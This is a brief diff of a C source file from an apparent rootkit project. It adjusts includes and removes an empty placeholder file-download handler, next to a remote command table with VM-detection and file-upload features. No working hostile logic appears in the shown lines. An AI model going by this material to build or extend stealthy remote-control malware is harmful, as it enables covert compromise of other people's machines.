@@ -15,12 +15,12 @@
 #include "menu.h"
 #include "passwd.h"
 #include "vanish.h"
-#include "utils/sysinfo.h"
+#include "sysinfo.h"
+#include "io.h"
 
 #define UPLOAD_BLOCK_SIZE 4096
 
 extern struct socket *get_worker_socket(void);
-
 
 static bool receiving_file = false;
 static char *upload_path = NULL;
@@ -76,12 +76,6 @@ static struct command rootkit_commands_array[] = {
     { "is_in_vm", 8, "check if remote rootkit is running in vm", 40, is_in_vm_handler },
     { NULL, 0, NULL, 0, NULL }
 };
-
-// Future implementation by thibounet
-static int get_file_handler(char *args) {
-    (void)args;
-    return 0;
-}
 
 static int is_in_vm_handler(char *args) {
     (void)args;
